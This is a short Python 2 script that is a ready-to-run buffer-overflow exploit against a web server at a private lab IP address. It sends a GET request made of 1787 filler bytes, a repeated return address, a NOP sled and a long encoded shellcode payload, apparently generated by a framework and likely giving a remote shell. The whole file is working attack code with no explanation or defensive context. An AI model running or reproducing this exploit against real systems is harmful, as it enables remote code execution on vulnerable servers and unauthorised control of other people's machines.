#!/usr/bin/python

import sys
import socket

pre_buff = 'GET '

shellcode =  ""
shellcode += "\xdb\xcd\xba\x23\x6c\xc9\x7b\xd9\x74\x24\xf4\x5f"
shellcode += "\x29\xc9\xb1\x52\x83\xc7\x04\x31\x57\x13\x03\x74"
shellcode += "\x7f\x2b\x8e\x86\x97\x29\x71\x76\x68\x4e\xfb\x93"
shellcode += "\x59\x4e\x9f\xd0\xca\x7e\xeb\xb4\xe6\xf5\xb9\x2c"
shellcode += "\x7c\x7b\x16\x43\x35\x36\x40\x6a\xc6\x6b\xb0\xed"
shellcode += "\x44\x76\xe5\xcd\x75\xb9\xf8\x0c\xb1\xa4\xf1\x5c"
shellcode += "\x6a\xa2\xa4\x70\x1f\xfe\x74\xfb\x53\xee\xfc\x18"
shellcode += "\x23\x11\x2c\x8f\x3f\x48\xee\x2e\x93\xe0\xa7\x28"
shellcode += "\xf0\xcd\x7e\xc3\xc2\xba\x80\x05\x1b\x42\x2e\x68"
shellcode += "\x93\xb1\x2e\xad\x14\x2a\x45\xc7\x66\xd7\x5e\x1c"
shellcode += "\x14\x03\xea\x86\xbe\xc0\x4c\x62\x3e\x04\x0a\xe1"
shellcode += "\x4c\xe1\x58\xad\x50\xf4\x8d\xc6\x6d\x7d\x30\x08"
shellcode += "\xe4\xc5\x17\x8c\xac\x9e\x36\x95\x08\x70\x46\xc5"
shellcode += "\xf2\x2d\xe2\x8e\x1f\x39\x9f\xcd\x77\x8e\x92\xed"
shellcode += "\x87\x98\xa5\x9e\xb5\x07\x1e\x08\xf6\xc0\xb8\xcf"
shellcode += "\xf9\xfa\x7d\x5f\x04\x05\x7e\x76\xc3\x51\x2e\xe0"
shellcode += "\xe2\xd9\xa5\xf0\x0b\x0c\x69\xa0\xa3\xff\xca\x10"
shellcode += "\x04\x50\xa3\x7a\x8b\x8f\xd3\x85\x41\xb8\x7e\x7c"
shellcode += "\x02\x07\xd6\x7f\x77\xef\x25\x7f\x76\x4b\xa0\x99"
shellcode += "\x12\xbb\xe5\x32\x8b\x22\xac\xc8\x2a\xaa\x7a\xb5"
shellcode += "\x6d\x20\x89\x4a\x23\xc1\xe4\x58\xd4\x21\xb3\x02"
shellcode += "\x73\x3d\x69\x2a\x1f\xac\xf6\xaa\x56\xcd\xa0\xfd"
shellcode += "\x3f\x23\xb9\x6b\xd2\x1a\x13\x89\x2f\xfa\x5c\x09"
shellcode += "\xf4\x3f\x62\x90\x79\x7b\x40\x82\x47\x84\xcc\xf6"
shellcode += "\x17\xd3\x9a\xa0\xd1\x8d\x6c\x1a\x88\x62\x27\xca"
shellcode += "\x4d\x49\xf8\x8c\x51\x84\x8e\x70\xe3\x71\xd7\x8f"
shellcode += "\xcc\x15\xdf\xe8\x30\x86\x20\x23\xf1\xb6\x6a\x69"
shellcode += "\x50\x5f\x33\xf8\xe0\x02\xc4\xd7\x27\x3b\x47\xdd"
shellcode += "\xd7\xb8\x57\x94\xd2\x85\xdf\x45\xaf\x96\xb5\x69"
shellcode += "\x1c\x96\x9f"

end_buff = " HTTP/1.1\r\n\r\n"
buffer = "A" * 1787 + "\x7E\x6E\xEF\x77" *4 + "\x90" * 8 + shellcode 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.193', 123))
s.send(pre_buff + buffer + end_buff)
s.recv(1024)
print "listo"
s.close()



